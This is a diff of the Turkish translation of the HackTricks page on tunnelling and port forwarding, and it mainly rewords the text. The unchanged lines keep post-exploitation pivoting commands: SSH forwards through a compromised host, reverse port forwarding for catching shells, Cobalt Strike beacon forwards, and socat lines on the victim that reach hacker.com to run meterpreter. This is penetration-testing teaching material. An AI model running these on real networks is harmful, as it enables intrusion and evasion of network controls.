@@ -1,8 +1,8 @@
 # Tünelleme ve Port Yönlendirme
 
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -65,13 +65,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer
+Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yere
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 ### Ters Port Yönlendirme
 
-Bu, iç hostlardan DMZ üzerinden kendi hostunuza ters shell almak için faydalıdır:
+Bu, DMZ üzerinden iç hostlardan kendi hostunuza ters shell almak için faydalıdır:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -97,7 +97,7 @@ Sunucu tarafında yönlendirmeyi etkinleştirin
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-İstemci tarafında yeni bir rota ayarlayın
+Yeni bir rota ayarlayın istemci tarafında
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
@@ -165,16 +165,16 @@ Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve trafik T
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Not edilmesi gerekenler:
+To note:
 
-* Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Trafiği Takım Sunucusuna tünellemek için tasarlanmıştır**.
+* Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
 * Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
 * **Yüksek portlarda ters port yönlendirmeleri oluşturmak için yönetici ayrıcalıkları gerekmez**.
 
-### rPort2Port yerel
+### rPort2Port local
 
 {% hint style="warning" %}
-Bu durumda, **port beacon ana bilgisayarında açılır**, Takım Sunucusunda değil ve **trafik Cobalt Strike istemcisine gönderilir** (Takım Sunucusuna değil) ve oradan belirtilen host:port'a iletilir.
+Bu durumda, **port beacon ana bilgisayarında açılır**, Team Server'da değil ve **trafik Cobalt Strike istemcisine gönderilir** (Team Server'a değil) ve oradan belirtilen host:port'a iletilir.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -190,8 +190,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresinden indirin.\
-**İstemci ve sunucu için aynı sürümü kullanmalısınız.**
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresinden indirin\
+**İstemci ve sunucu için aynı sürümü kullanmalısınız**
 
 ### socks
 ```bash
@@ -296,7 +296,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Bir **kimlik doğrulaması yapılmamış proxy**'yi, kurbanın konsolundaki son satırın yerine bu satırı çalıştırarak atlayabilirsiniz:
+**Kimlik doğrulaması yapılmamış bir proxy**'yi atlatmak için, kurbanın konsolundaki son satır yerine bu satırı çalıştırabilirsiniz:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -353,10 +353,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-**Sisteme RDP erişimine sahip olmalısınız**.\
+Sisteme **RDP erişimine sahip olmalısınız**.\
 İndirin:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Servisi özelliğinden `Dinamik Sanal Kanallar` (`DVC`) kullanır. DVC, **RDP bağlantısı üzerinden paketleri tünellemekten** sorumludur.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Servisi özelliğinden `Dynamic Virtual Channels` (`DVC`) kullanır. DVC, **RDP bağlantısı üzerinden paketleri tünellemekten** sorumludur.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:
@@ -370,7 +370,7 @@ Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabi
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Şimdi, makinenizde (saldırgan) 1080 numaralı portun dinlediğini doğrulayın:
+Şimdi, makinenizde (saldırgan) 1080 numaralı portun dinlendiğini doğrulayın:
 ```
 netstat -antb | findstr 1080
 ```
@@ -379,8 +379,8 @@ netstat -antb | findstr 1080
 ## Windows GUI Uygulamalarını Proxify Etme
 
 Windows GUI uygulamalarının bir proxy üzerinden gezinmesini sağlamak için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.\
-**Profile -> Proxy Servers** kısmına SOCKS sunucusunun IP'sini ve portunu ekleyin.\
-**Profile -> Proxification Rules** kısmına proxify etmek istediğiniz programın adını ve proxify etmek istediğiniz IP'lere olan bağlantıları ekleyin.
+**Profil -> Proxy Sunucuları** kısmına SOCKS sunucusunun IP'sini ve portunu ekleyin.\
+**Profil -> Proxification Kuralları** kısmına proxify etmek istediğiniz programın adını ve proxify etmek istediğiniz IP'lere olan bağlantıları ekleyin.
 
 ## NTLM proxy atlatma
 
@@ -393,7 +393,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel olarak bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
+Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
 Örneğin, 443 portunu yönlendirin.
 ```
 Username Alice
@@ -402,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
+Şimdi, eğer kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız, ona saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
@@ -465,7 +465,7 @@ Proxychains `gethostbyname` libc çağrısını keser ve tcp DNS isteğini socks
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak veri tünellemek için root gereklidir.
+Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak aralarında veri tünellemek için root gereklidir.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -523,8 +523,8 @@ _Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._
 ```
 #### HTTP çağrılarını dinleme
 
-_XSS, SSRF, SSTI ... için faydalıdır._\
-Doğrudan stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000).
+_XSS, SSRF, SSTI ... için yararlıdır._\
+stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) adresinden doğrudan.
 
 #### Dahili HTTP hizmetini tünelleme
 ```bash
@@ -538,7 +538,7 @@ Doğrudan stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.
 3 tünel açar:
 
 * 2 TCP
-* 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sergilenmesiyle
+* 1 HTTP, /tmp/httpbin/ dizininden statik dosya sergilemesiyle
 ```yaml
 tunnels:
 mytcp:
@@ -557,8 +557,8 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
